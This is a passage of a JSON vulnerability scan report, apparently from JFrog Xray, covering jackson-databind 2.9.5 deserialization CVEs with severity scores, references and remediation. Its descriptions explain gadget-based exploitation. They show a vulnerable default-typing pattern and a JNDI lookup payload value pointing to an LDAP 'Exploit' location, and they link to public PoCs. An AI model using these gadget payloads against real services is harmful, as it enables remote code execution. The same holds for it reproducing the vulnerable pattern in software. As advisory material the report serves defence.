          "https://lists.apache.org/thread.html/r80e8882c86c9c17a57396a5ef7c4f08878d629a0291243411be0de3a@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r33d25a342af84102903cd9dec8338a5bcba3ecfce10505bdfe793b92%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r0fbf2c60967bc9f73d7f5a62ad3b955789f9a14b950f42e99fca9b4e@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r0066c1e862613de402fee04e81cbe00bcd64b64a2711beb9a13c3b25%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/re07c51a8026c11e6e5513bfdc66d52d1c1027053e480fb8073356257@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/re646dcc2739d92117bf9a76a33c600ed3b65e8b4e9b6f441e366b72b@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/08/msg00039.html",
          "https://lists.apache.org/thread.html/rd27730cfc3066dfcf15927c8e800603728d5dedf17eee1f8c6e3507c%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r21ac3570ce865b8f1e5d26e492aeb714a6aaa53a0c9a6f72ef181556%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r0d8c3e32a0a2d8a0b6118f5b3487d363afdda80c996d7b930097383d%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/ra37700b842790883b9082e6b281fb7596f571b13078a4856cd38f2c2@%3Ccommits.cassandra.apache.org%3E",
          "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10172",
          "https://lists.apache.org/thread.html/r68acf97f4526ba59a33cc6e592261ea4f85d890f99e79c82d57dd589%40%3Cissues.spark.apache.org%3E",
          "https://lists.apache.org/thread.html/r356592d9874ab4bc9da4754592f8aa6edc894c95e17e58484bc2af7a%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rb8c09b14fd57d855dc21e0a037dc29258c2cbe9c1966bfff453a02e4%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r04ecadefb27cda84b699130b11b96427f1d8a7a4066d8292f7f15ed8@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r1cc8bce2cf3dfce08a64c4fa20bf38d33b56ad995cee2e382f522f83@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rce00a1c60f7df4b10e72fa87827c102f55b074bb91993631df2c21f9@%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r68acf97f4526ba59a33cc6e592261ea4f85d890f99e79c82d57dd589@%3Cissues.spark.apache.org%3E",
          "https://lists.apache.org/thread.html/re07c51a8026c11e6e5513bfdc66d52d1c1027053e480fb8073356257%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r08e1b73fabd986dcd2ddd7d09480504d1472264bed2f19b1d2002a9c@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r1cc8bce2cf3dfce08a64c4fa20bf38d33b56ad995cee2e382f522f83%40%3Ccommon-issues.hadoop.apache.org%3E"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-9547",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig (aka ibatis-sqlmap).",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95101",
        "references": [
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd%40%3Cissues.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200904-0006/",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/r4accb2e0de9679174efd3d113a059bab71ff3ec53e882790d21c1cc1@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r742ef70d126548dcf7de5be5779355c9d76a9aec71d7a9ef02c6398a@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r4accb2e0de9679174efd3d113a059bab71ff3ec53e882790d21c1cc1%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r742ef70d126548dcf7de5be5779355c9d76a9aec71d7a9ef02c6398a%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6%40%3Cissues.zookeeper.apache.org%3E",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rd0e958d6d5c5ee16efed73314cd0e445c8dbb4bdcc80fc9d1d6c11fc%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r893a0104e50c1c2559eb9a5812add28ae8c3e5f43712947a9847ec18%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r893a0104e50c1c2559eb9a5812add28ae8c3e5f43712947a9847ec18@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596%40%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://github.com/FasterXML/jackson-databind/issues/2634",
          "https://lists.apache.org/thread.html/ra3e90712f2d59f8cef03fa796f5adf163d32b81fe7b95385f21790e6%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/redbe4f1e21bf080f637cf9fbec47729750a2f443a919765360337428%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2",
          "https://lists.apache.org/thread.html/rd0e958d6d5c5ee16efed73314cd0e445c8dbb4bdcc80fc9d1d6c11fc@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/03/msg00008.html",
          "https://lists.apache.org/thread.html/rc0d5d0f72da1ed6fc5e438b1ddb3fa090c73006b55f873cf845375ab@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rc0d5d0f72da1ed6fc5e438b1ddb3fa090c73006b55f873cf845375ab%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/advisories/GHSA-q93h-jc49-78gg",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb@%3Cissues.zookeeper.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-9547",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/ra3e90712f2d59f8cef03fa796f5adf163d32b81fe7b95385f21790e6@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/redbe4f1e21bf080f637cf9fbec47729750a2f443a919765360337428@%3Cnotifications.zookeeper.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in ibatis-sqlmap in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig ` gadget in [ibatis]( https://github.com/mybatis/mybatis-2), the attacker can call `lookup` with an arbitrary location by calling `setUserTransaction` and `setProperties ` with an arbitrary argument such as `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://github.com/fairyming/CVE-2020-9547/blob/master/Poc.java).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` ibatis.sqlmap ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` ibatis.sqlmap ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `ibatis.sqlmap` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-14892",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-200",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-200": {
                "name": "Exposure of Sensitive Information to an Unauthorized Actor",
                "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5 and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.8.11.5]",
              "[2.9.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95121",
        "references": [
          "https://access.redhat.com/errata/RHSA-2020:0729",
          "https://github.com/FasterXML/jackson-databind/issues/2462",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200904-0005/",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/819cdbcab51c6da9fb896380f2d46e9b7d4fdc3b",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-14892",
          "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14892",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/41b7f9b90149e9d44a65a8261a8deedc7186f6af",
          "https://github.com/advisories/GHSA-cf6r-3wgc-h863"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-configuration in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the `org.apache.commons.configuration.JNDIConfiguration` gadget in [commons-configuration](https://github.com/apache/commons-configuration) might allow remote code execution but this is nontrivial and has never been proven publicly, thus the real-world impact is uncertain.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` commons-configuration ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` commons-configuration ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `commons-configuration` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-10650",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A deserialization flaw was discovered in jackson-databind through 2.9.10.4. It could allow an unauthenticated user to perform code execution via ignite-jta or quartz-core: org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup, org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory, and org.quartz.utils.JNDIConnectionProvider.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-412669",
        "references": [
          "https://github.com/FasterXML/jackson-databind/commit/a424c038ba0c0d65e579e22001dec925902ac0ef",
          "https://security.netapp.com/advisory/ntap-20230818-0007/",
          "https://github.com/FasterXML/jackson-databind/issues/2658",
          "https://github.com/FasterXML/jackson-databind/pull/2864",
          "https://github.com/advisories/GHSA-rpr3-cw39-3pxh",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20230818-0007",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-10650",
          "https://github.com/luisgarciacheckmarx/LGV_onefile/issues/19",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.debian.org/debian-lts-announce/2023/04/msg00032.html",
          "https://www.oracle.com/security-alerts/cpuoct2022.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in ignite-jta in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `org.quartz.utils.JNDIConnectionProvider`, `org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup` and `org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory` gadgets in [ignite-jta]( https://ignite.apache.org/releases/latest/javadoc/org/apache/ignite/cache/jta/package-summary.html), the attacker can call `lookup` with an arbitrary location. This vulnerability allows the attacker to perform remote code execution as demonstrated in this [PoC](https://github.com/fairyming/CVE-2020-9548/blob/master/Poc.java).\n\n\nExploitation requires:\n\n-       Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `ignite-jta` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `ignite-jta` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `ignite-jta` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Deployment mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Deployment mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-24750",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.6 mishandles the interaction between serialization gadgets and typing, related to com.pastdev.httpcomponents.configuration.JndiConfiguration.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.5]",
              "[2.9.10.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-124821",
        "references": [
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://security.netapp.com/advisory/ntap-20201009-0003",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/ad5a630174f08d279504bc51ebba8772fd71b86b",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-24750",
          "https://github.com/FasterXML/jackson-databind/commit/2118e71325486c68f089a9761c9d8a11b4ddd1cb",
          "https://github.com/FasterXML/jackson-databind/commit/6cc9f1a1af323cd156f5668a47e43bab324ae16f",
          "https://github.com/FasterXML/jackson-databind",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/FasterXML/jackson-databind/issues/2798",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://security.netapp.com/advisory/ntap-20201009-0003/"
        ],
        "extended_information": {
          "short_description": "A typing issue in pastdev.httpcomponents in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling 